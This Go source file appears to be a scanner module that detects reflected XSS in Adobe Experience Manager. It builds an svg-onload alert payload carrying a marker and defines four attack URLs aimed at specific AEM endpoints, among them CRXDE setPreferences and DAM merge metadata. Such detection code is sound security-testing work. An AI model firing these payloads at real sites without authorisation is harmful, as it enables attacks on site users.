package aem_xss

// xssPayload builds the svg-onload breakout carrying a unique alnum marker as a
// JS string, so a fired dialog's message equals the marker (attributable) and the
// unencoded form is a distinctive reflection signature. The slash form
// (<svg/onload=…>) avoids a space so the payload survives the URL verbatim.
func xssPayload(marker string) string {
	return "<svg/onload=alert('" + marker + "')>"
}

// sink is one AEM reflected-XSS location: how to build the attack URL and what
// status/content-type qualify. The unencoded breakout signature expected in the
// body is always xssPayload(marker), so it is not stored per-sink.
type sink struct {
	id          string
	name        string
	tags        []string
	ref         []string
	requireHTML bool
	okStatus    func(int) bool
	build       func(marker string) string
}

func is200(s int) bool      { return s == 200 }
func is200or400(s int) bool { return s == 200 || s == 400 }

var sinks = []sink{
	{
		id:          "childlist-selector",
		name:        "AEM Childlist Selector Reflected XSS",
		tags:        []string{"selector"},
		ref:         []string{"https://speczz.medium.com/aem-hacking-resources"},
		requireHTML: true,
		okStatus:    is200,
		build: func(m string) string {
			return "/etc/designs/xh1x.childrenlist.json//" + xssPayload(m) + ".html"
		},
	},
	{
		id:          "setpreferences",
		name:        "AEM CRXDE setPreferences Reflected XSS",
		tags:        []string{"crxde"},
		requireHTML: false, // renders as a JSONObject error page (400) that still executes
		okStatus:    is200or400,
		build: func(m string) string {
			return "/crx/de/setPreferences.jsp;%0A.html?language=en&keymap=" + xssPayload(m) + "//a"
		},
	},
	{
		id:          "merge-metadata",
		name:        "AEM DAM MergeMetadata Reflected XSS",
		tags:        []string{"dam"},
		requireHTML: true,
		okStatus:    is200,
		build: func(m string) string {
			return "/libs/dam/merge/metadata.html?path=" + xssPayload(m) + "&.ico"
		},
	},
	{
		id:          "wcm-suggestions",
		name:        "AEM WCM ContentFinder Suggestions Reflected XSS",
		tags:        []string{"wcm", "contentfinder"},
		requireHTML: true,
		okStatus:    is200,
		build: func(m string) string {
			return "/bin/wcm/contentfinder/connector/suggestions.json/j.html?query_term=path:/&pre=" + xssPayload(m) + "&post=jjj"
		},
	},
}
